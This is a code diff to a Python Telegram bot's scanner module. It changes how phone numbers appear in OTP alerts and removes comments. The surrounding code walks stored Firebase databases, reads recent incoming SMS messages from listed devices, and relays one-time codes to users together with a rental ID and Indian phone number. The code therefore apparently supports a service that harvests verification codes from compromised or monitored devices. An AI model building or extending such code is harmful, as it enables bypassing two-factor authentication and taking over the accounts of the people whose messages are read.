@@ -7,12 +7,15 @@ from utils.ui import sc
 log = logging.getLogger("Scanner")
 
 async def send_otp_to_user(bot, uid, service, otp, msg_text, rent_id, phone_number):
+    # 🔥 Fix: Agar number unknown hai to +91 mat lagao
+    num_display = f"+91{phone_number}" if phone_number and phone_number != "Unknown" else "Unknown"
+    
     otp_msg = (
         f"🔔 <b>{sc('otp received')}!</b>\n\n"
         f"📱 <b>{sc('service')}:</b> {service}\n"
         f"🔑 <b>{sc('otp')}:</b> <code>{otp}</code>\n\n"
         f"🆔 <b>{sc('rent id')}:</b> <code>{rent_id}</code>\n"
-        f"📞 <b>{sc('number')}:</b> <code>+91{phone_number if phone_number else 'Unknown'}</code>\n"
+        f"📞 <b>{sc('number')}:</b> <code>{num_display}</code>\n"
         f"💬 <i>{msg_text[:60]}...</i>"
     )
     kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"{otp}", copy_text=CopyTextButton(text=otp))]])
@@ -105,14 +108,13 @@ async def backup_scanner():
             d = db.load_data()
             fbs = d.get("firebases", [])
             if fbs:
-                # Scan 2 random firebases every 5 mins to avoid API rate limit
                 random.shuffle(fbs)
                 for fb in fbs[:2]:
                     clients = await fbu.fetch_fb(f"{fb['url']}/clients.json", fb.get("auth"))
                     if not clients: continue
                     dev_ids = list(clients.keys())
                     random.shuffle(dev_ids)
-                    for dev_id in dev_ids[:10]: # 10 devices per fb
+                    for dev_id in dev_ids[:10]: 
                         msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=5", fb.get("auth"))
                         if msgs:
                             msgs_list = [v for k, v in msgs.items() if isinstance(v, dict) and v.get("type") == "incoming"]
@@ -122,14 +124,13 @@ async def backup_scanner():
                                 if "device_backups" not in d: d["device_backups"] = {}
                                 d["device_backups"][dev_id] = {"numbers": nums, "time": int(time.time())}
             
-            # Cleanup old backups (2 days)
             now = int(time.time())
             if "device_backups" in d:
                 for dev_id in list(d["device_backups"].keys()):
                     if now - d["device_backups"][dev_id].get("time", 0) > 172800:
                         del d["device_backups"][dev_id]
             db.save_data(d)
-            await asyncio.sleep(300) # 5 mins
+            await asyncio.sleep(300) 
         except Exception as e:
             log.error(f"Backup Scanner error: {e}")
             await asyncio.sleep(60)
